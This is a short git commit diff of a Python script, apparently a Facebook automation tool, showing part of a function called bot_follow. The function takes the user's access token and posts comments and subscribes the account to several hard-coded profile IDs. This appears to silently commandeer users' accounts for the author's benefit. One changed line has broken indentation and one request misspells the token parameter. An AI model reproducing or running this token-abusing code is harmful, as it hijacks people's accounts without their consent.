924fabf86ab65f165f7e6526232bb4e98e323bce
Mantalstudio <75010285+Mantalstudio@users.noreply.github.com>
2022-01-14 16:19:02 +0500

    Update and rename test2.py to t.py

--- t.py
+++ t.py
@@ -279,9 +279,9 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komen +'&access_token=' + toket)
 	requests.post('https://graph.facebook.com/' + postdua + '/comments/?message=' + komendua + '&acces_token'+toket)
 	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
-	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Meyy
+	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Me
 	requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # Izhar
-    requests.post('https://graph.facebook.com/924552875165817/subscribers?access_token=' + toket) # Putri
+        requests.post('https://graph.facebook.com/924552875165817/subscribers?access_token=' + toket) # Put
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
